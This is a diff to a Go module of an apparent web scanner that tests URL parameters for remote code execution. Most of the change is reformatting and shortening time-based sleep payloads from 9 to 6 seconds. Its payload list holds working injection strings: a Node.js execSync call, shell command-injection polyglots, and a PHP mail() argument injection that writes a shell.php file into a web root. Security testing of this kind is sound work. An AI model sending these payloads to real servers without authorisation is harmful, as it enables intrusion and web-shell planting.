@@ -16,15 +16,15 @@ import (
 type RCEPayload struct {
 	Name    string
 	Payload string
-	Check   string 
+	Check   string
 	IsTime  bool
 }
 
 var RCEPayloads = []RCEPayload{
 	{"JS Framework RCE (Node.js)", "process.mainModule.require('child_process').execSync('id').toString()", "uid=", false},
-	{"Command Injection Polyglot", "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}", "", true},
+	{"Command Injection Polyglot", "1;sleep${IFS}6;#${IFS}';sleep${IFS}6;#${IFS}\";sleep${IFS}6;#${IFS}", "", true},
 	{"PHP mail() RCE", "hacker@example.com -OQueueDirectory=/tmp/ -X/var/www/html/shell.php", "", false},
-	{"OS Command Injection (sleep)", "|| sleep 9", "", true},
+	{"OS Command Injection (sleep)", "|| sleep 6", "", true},
 }
 
 func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
@@ -38,18 +38,26 @@ func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound fun
 
 	evalParams := []string{"code", "eval", "query", "cmd", "exec", "q"}
 	testParams := make(map[string]string)
-	
+
 	if len(q) == 0 {
 		if strings.Contains(baseURL, "api") || strings.Contains(baseURL, "eval") {
-			for _, ep := range evalParams { testParams[ep] = "1" }
+			for _, ep := range evalParams {
+				testParams[ep] = "1"
+			}
 		}
 	} else {
-		for param := range q { testParams[param] = q.Get(param) }
+		for param := range q {
+			testParams[param] = q.Get(param)
+		}
 	}
 
 	for _, p := range RCEPayloads {
-		if isFound { break }
-		if strings.Contains(p.Name, "Node.js") && ctx.Language != "node" && ctx.Language != "unknown" { continue }
+		if isFound {
+			break
+		}
+		if strings.Contains(p.Name, "Node.js") && ctx.Language != "node" && ctx.Language != "unknown" {
+			continue
+		}
 
 		for paramName := range testParams {
 			wg.Add(1)
@@ -58,36 +66,44 @@ func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound fun
 				semaphore <- struct{}{}
 				defer func() { <-semaphore }()
 
-				if isFound { return }
+				if isFound {
+					return
+				}
 
 				fuzzU, _ := url.Parse(baseURL)
 				fuzzQ := fuzzU.Query()
-				for k, v := range testParams { fuzzQ.Set(k, v) }
+				for k, v := range testParams {
+					fuzzQ.Set(k, v)
+				}
 				fuzzQ.Set(targetParam, payload.Payload)
 				fuzzU.RawQuery = fuzzQ.Encode()
 				target := fuzzU.String()
 
 				start := time.Now()
 				req, errReq := http.NewRequest("GET", target, nil)
-				if errReq != nil { return }
+				if errReq != nil {
+					return
+				}
 				utils.SetDefaultHeaders(req, target)
 				resp, err := client.Do(req)
 				duration := time.Since(start).Seconds()
 
-				if err != nil { return }
+				if err != nil {
+					return
+				}
 				defer resp.Body.Close()
 
 				body, _ := io.ReadAll(resp.Body)
 				bodyStr := string(body)
 
 				if payload.IsTime {
-					if duration >= 9.0 {
+					if duration >= 6.5 {
 						// Verification
 						start2 := time.Now()
 						req2, _ := http.NewRequest("GET", target, nil)
 						utils.SetDefaultHeaders(req2, target)
 						client.Do(req2)
-						if time.Since(start2).Seconds() >= 9.0 {
+						if time.Since(start2).Seconds() >= 6.5 {
 							foundMu.Lock()
 							if !isFound {
 								isFound = true
